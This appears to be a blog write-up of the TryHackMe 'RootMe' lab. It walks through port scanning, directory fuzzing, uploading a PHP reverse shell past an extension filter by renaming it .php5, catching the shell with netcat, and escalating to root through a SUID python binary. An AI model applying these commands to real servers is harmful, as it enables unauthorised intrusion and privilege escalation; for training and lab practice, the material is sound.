---
layout: post
title: THM RootMe WriteUp
date: 2025-01-04
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Upload-File
  - Fuzzing
  - Bypassing-File-Upload
  - Abusing-SUID-Python
  - OSCP
media_subpath: /assets/img/RootMe
---
![Desktop View](Rootme.png){: w="400"  h="400" }



# RootMe Skills


>**RootMe** is an easy Linux machine where we will use the following skills:

-  **Port Discovery**
-  **Web Fuzzing**
-  **Web Tech's Enumeration**
- **Bypassing File Extension Firewall**
- **Abusing SUID Binary** 

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22** & port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.245.18 -oG allPorts
Nmap scan report for 10.10.245.18
Host is up, received user-set (0.081s latency).
Scanned at 2025-01-04 04:41:51 CET for 16s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80 10.10.245.18 -oN targeted
Nmap scan report for 10.10.245.18
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3**
- **Port 80 --> Apache httpd 2.4.29**

Let's start with the Apache web server.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.245.18
http://10.10.245.18 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.245.18], Script, Title[HackIT - Home]
```

The only valuable information that we can see in the results is in the **Cookies** field, it tells us that the server can interpret **PHP** code, so let's take a look inside the website, once inside ***http://10.10.148.70***, we are in front of non-interactive web that shows a **Shell Prompt** & a text telling ***Can you root me?***.

![Desktop View](RootmeMainPage.png)

Seeing that we can not do much and that the SSH service don't look exploitable, let's try fuzzing the web server.

## Port 80 Exploitation

I will use `gobuster` to brute-force directories.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.245.18 -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.245.18
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.245.18/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.245.18/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.245.18/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.245.18/uploads/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

Bingo, we have found two folders that look interesting: `/panel` & `/uploads`, let's check them.

Once inside `/panel` we can see a panel for file uploading, this is really interesting, let's try uploading a **PHP reverse shell**.

![Desktop View](RootmeMainPage2.png)

I used the monkey pentester `php-reverse-shell`, if you are using **Kali** or **Parrot** you can make a copy in your current directory with the following command:

```bash
❯ cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .
```

Just modify your **IP Address** & **Port** in the code and it's ready to use.

I tried to upload the PHP file but we get a error in Portuguese (idk), that tell us that the server doesn't allow PHP files, so let's try to bypass the checks that the server is doing to detect that is a PHP file.

![Desktop View](RootmeUploadDenied.png)

We will use `BurpSuite` for this task, i enabled `FoxyProxy` and started intercepting request.

Once with the request intercepted, i started changing the `Content-Type` but just that didn't worked, so i changed the file extension to other valid PHP extensions (`.php4, .php5, etc)` and that worked perfectly.

![Desktop View](RootmeBurp.png)

Once uploaded we can suppose that it is saved inside the `/uploads` directory but if we check the response in `burpsuite` it shows that the file is being saved at `/uploads/php-reverse-shell.php5`, this way we can see that is being saved with the same name.

## Gaining a Shell

Once with the reverse shell uploaded and knowing it's location, let's get the shell.

Let's set a listener with `netcat` and then we will request the reverse shell that we just upload.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
```

Then i requested the reverse shell.

```bash
❯ curl http://10.10.245.18/uploads/php-reverse-shell.php5
```

We then get the shell.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.11.116.52] from (UNKNOWN) [10.10.245.18] 47940
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 04:39:30 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

## Shell as www-data

Now that we own a full TTY we can take a look to the `user.txt` flag, but after checking the `/home` directory, both of the directories are empty, so i scanned the whole file system looking for a file named `user.txt`.

```bash
www-data@rootme:/$ find -name user.txt 2>/dev/null
./var/www/user.txt
```

It's located in the web server root, let's open the file:

```bash
www-data@rootme:/$ cat /var/www/user.txt
THM{**u_**t_a_***ll}
```

Then i started testing common PrivEsc methods and when i looked for **SUID** binaries i found that the  `python` binary is flagged as **SUID**.

```bash
www-data@rootme:/$ find -perm -4000 2>/dev/null                         
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/traceroute6.iputils
./usr/bin/newuidmap
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/python
./usr/bin/at
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
```

Taking a look to [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) i found that we can spawn a shell via the `os` module.

```bash
www-data@rootme:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```

Now we can see the root flag located in `/root/root.txt`

```bash
# cat root.txt
THM{p****l3g3_3sc****10n}
```

---
## Final Thoughts

The **RootMe CTF** provided a straightforward yet insightful experience, emphasizing basic web exploitation and privilege escalation. It’s a great challenge for beginners to solidify fundamental skills while building confidence for more advanced scenarios.

![Desktop View](RootmePwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

